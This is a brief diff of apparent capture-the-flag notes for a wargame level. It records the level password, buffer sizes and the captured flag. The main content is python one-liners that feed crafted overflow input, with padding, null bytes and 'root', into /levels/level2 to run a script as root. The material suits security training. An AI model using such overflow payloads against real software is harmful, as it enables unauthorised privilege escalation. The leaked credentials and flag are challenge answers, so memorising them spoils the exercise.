@@ -1,0 +1,27 @@
+User : level2
+Pass : TJyK9lJwZrgqc8nIIF6o
+
+TestInput : 
+nobody
+Ksdkjkk32avsh
+/tmp/j3romee/testScript.sh
+
+64 Bytes for Command
+32 Bytes for password
+32 Bytes for user
+
+user Var start at 96
+
+
+testScriptInput
+python -c 'print "nobody\n"+"Ksdkjkk32avsh\n"+"/tmp/j3romee/testScript.sh\n"' | /levels/level2
+
+
+Getting Root Input
+python -c 'print "nobody\n"+"Ksdkjkk32avsh\n"+"C"*63+"\x00"+"P"*32+"root\x00"'
+
+Root execution of script :
+python -c 'print "nobody\n"+"Ksdkjkk32avsh\n"+"/tmp/j3romee/testScript.sh\x00"+"R"*36+"\x00"+"P"*32+"root\x00"'
+
+
+Flag : b130hOOfGftXUfmRZlgD
